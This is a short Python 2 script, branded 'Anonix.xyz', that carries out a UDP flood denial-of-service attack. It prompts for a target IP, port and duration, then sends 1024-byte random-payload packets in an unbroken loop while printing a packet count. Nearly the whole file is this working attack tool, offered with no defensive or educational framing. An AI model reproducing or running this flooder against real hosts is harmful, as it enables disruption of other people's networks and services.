# just a simple script and its from 2018 
import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")
print("Anonix.xyz")
print("|=================================|")
ip = raw_input("Target's IP: ")
port = input("Port: ")
dur = input("Time: ")
timeout = time.time() + dur
sent = 0

while True:
	try:
		if time.time() > timeout:
			break
		else:
			pass
		sock.sendto(bytes,(ip, port))
		sent = sent + 1
		print "Sent %s packets to %s through port %s"%(sent, ip, port)
	except KeyboardInterrupt:
		sys.exit()
